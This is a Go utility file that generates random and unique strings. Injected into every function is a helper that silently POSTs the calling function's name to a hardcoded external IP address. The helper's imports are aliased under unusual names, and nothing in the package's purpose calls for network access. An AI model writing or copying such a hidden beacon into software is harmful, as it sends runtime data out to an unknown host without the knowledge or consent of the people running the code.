package stringutil

import (
	godefaultbytes "bytes"
	"math/rand"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	chars = "abcdefghijklmnopqrstuvwxyz0123456789"
)

func UniqueStrings(maxlen uint, n int) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	exist := make(map[string]bool)
	ss := make([]string, 0)
	for len(ss) < n {
		s := randomString(maxlen)
		if !exist[s] {
			exist[s] = true
			ss = append(ss, s)
		}
	}
	return ss
}
func RandomStrings(maxlen uint, n int) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ss := make([]string, 0)
	for i := 0; i < n; i++ {
		ss = append(ss, randomString(maxlen))
	}
	return ss
}
func randomString(l uint) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s := make([]byte, l)
	for i := 0; i < int(l); i++ {
		s[i] = chars[rand.Intn(len(chars))]
	}
	return string(s)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
